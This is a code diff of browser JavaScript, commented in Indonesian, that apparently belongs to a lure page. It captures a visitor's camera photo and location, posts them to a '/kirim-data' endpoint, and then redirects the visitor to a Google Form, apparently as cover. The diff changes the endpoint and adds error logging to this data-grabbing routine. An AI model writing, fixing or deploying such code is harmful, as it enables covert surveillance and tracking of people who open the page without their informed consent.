@@ -1,3 +1,5 @@
+
+
 // Fungsi untuk mengambil foto dari kamera
 async function ambilFoto() {
     try {
@@ -53,14 +55,17 @@ async function jalankanSkenario() {
     // Cek apakah setidaknya satu data berhasil diambil (foto atau lokasi)
     if (foto || lokasi) {
         // Kirim data ke server (endpoint API)
-        await fetch('/.netlify/functions/kirim-data', {
+        const response = await fetch('/kirim-data', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({ foto: foto, lokasi: lokasi })
         });
-        
+        if (!response.ok) {
+            console.error('Failed to send data:', response.statusText);
+        }
+
         // Alihkan ke Google Form
         window.location.href = 'https://forms.gle/wsZXjekLsggYzPQi9';
 
